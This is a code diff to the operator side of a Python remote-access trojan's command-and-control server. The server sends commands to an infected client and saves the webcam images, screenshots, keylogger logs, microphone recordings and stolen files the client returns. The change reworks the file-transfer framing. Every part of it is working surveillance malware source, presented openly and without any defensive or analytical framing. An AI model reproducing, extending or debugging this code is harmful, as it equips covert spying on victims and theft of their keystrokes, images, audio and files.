@@ -1,45 +1,55 @@
 import socket
 import base64
 import time
-import keyboard
-
+import struct
 #create socket for client connection(n9drou ndirou multiple clients !)
+def recvall(sock, size):
+    data = b""
+    while len(data) < size:
+        packet = sock.recv(size - len(data))
+        if not packet:
+            return None
+        data += packet
+    return data
+
+def send_file(sock, path):
+    with open(path, "rb") as f:
+        data = f.read()
+
+    size = len(data)
+
+    sock.sendall(struct.pack("!Q", size))
+    sock.sendall(data)
+
+
 def handle_client(client_socket):
 	while True:
 		try:
-			
 			command = input("C2> Enter a Command: ")
-			client_socket.send(command.encode())
 			if command.lower() == 'exit':
 				break
-			
 			if command.startswith('upload '):
 				local_path = command.split(' ')[1]
-				with open(local_path, 'rb') as f:
-					file_data = f.read()
-				encoded_data = base64.b64encode(file_data).decode()
-				command = f"upload {command.split(' ')[2]}"
 				client_socket.send(command.encode())
-				client_socket.send(encoded_data.encode())
-				output = client_socket.recv(4096).decode()
-				print(output)
+				send_file(client_socket,local_path)
+				print(client_socket.recv(1024).decode())
 				continue
 
-			output = client_socket.recv(10000000).decode()
+			client_socket.send(command.encode())
 			
-			print(output)
-
-			if  command.startswith(('download', 'webcam', 'screenshot', 'getkeylogger', 'getmicrecord')):
+			
+			
+			if  command.startswith(('download', 'webcam', 'screenshot','getmicrecord', 'getkeylogger')):
 				try:
-					output = base64.b64decode(output.encode())
+					size = struct.unpack("!Q", recvall(client_socket, 8))[0]
+					encoded_data = recvall(client_socket, size)
 				except Exception :
+					print("Error: Incorrect Using")
 					continue
 				if command == 'screenshot':
 					filename = f"screenshot{int(time.time())}.png"
 				elif command == 'webcam':
 					filename = f"webcam{int(time.time())}.png"
-				elif command.startswith('mic'):
-					filename = f"microphone{int(time.time())}.wav"
 				elif command == 'getkeylogger':
 					filename = f"keylogg{int(time.time())}.txt"
 				elif command == 'getmicrecord':
@@ -48,17 +58,16 @@ def handle_client(client_socket):
 					filename = command[9:]
 				try:
 					with open(filename, 'wb') as f:
-						f.write(output)
+						f.write(encoded_data)
 					print(f"File {filename} downloaded successfully.")
 					continue
 				except Exception as e:
 					print(f"[-] Failed to save file: {e}")
 					continue
+			else : 
+				output = client_socket.recv(1024).decode()
+				print(output)
 			#keylogg wela ymchi !
-			if command == 'mic':
-				continue
-			if command == 'keylogger':
-				continue
 				
 		except Exception as e:
 			print(f"An error occurred: {e}")
